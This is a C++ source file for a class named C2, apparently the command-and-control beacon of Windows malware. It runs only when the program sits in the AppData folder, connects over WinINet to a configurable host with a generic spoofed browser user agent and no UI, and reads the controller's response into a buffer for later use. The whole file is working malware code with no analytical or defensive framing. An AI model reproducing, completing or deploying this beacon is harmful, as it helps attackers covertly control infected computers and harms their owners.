#include "pch.h"
#include "C2.h"
#include <windows.h>
#include <wininet.h>
#include <winsock.h>
#include <stdio.h>
#include <fstream>
#include <cstring>
#include <iostream>



void C2::setHostName(LPCSTR hostName) {
	this->hostName = hostName;
}

void C2::setPathName(LPCSTR pathName) {
	this->pathName = pathName;
}

void C2::cleanup() {
	InternetCloseHandle(this->sessionHandle);
	InternetCloseHandle(this->connectHandle);
	InternetCloseHandle(this->requestHandle);
}

void C2::execute() {
	
	if (!this->util.isInAppData()) {
		return;
	}

	this->response = ""; // reset response

	this->error = InternetAttemptConnect(0);
	if (error != ERROR_SUCCESS) {
		cleanup();
		return;
	}
	this->sessionHandle = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);

	if (sessionHandle == NULL) {
		this->error = GetLastError();
		cleanup();
		return;
	}

	this->connectHandle = InternetConnect(this->sessionHandle, this->hostName, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	
	if (this->connectHandle == NULL) {
		this->error = GetLastError();
		cleanup();
		return;
	}
	this->requestHandle = HttpOpenRequest(this->connectHandle,"GET",this->pathName,NULL,NULL,NULL,INTERNET_FLAG_NO_UI,NULL);

	if (this->requestHandle == NULL) {
		this->error = GetLastError();
		cleanup();
		return;
	}

	
	BOOL sent = HttpSendRequest(this->requestHandle,NULL, 0, NULL, 0);
	if (!sent) {
		this->error = GetLastError();
		cleanup();
		return;
	}


	BYTE buffer = 0;
	DWORD dword;
	if (sent == TRUE) {
		while (InternetReadFile(this->requestHandle,&buffer,1,&dword)== TRUE && dword != 0) {
			this->response.append((char*)&buffer, 1);
		}
	}

	cleanup();
}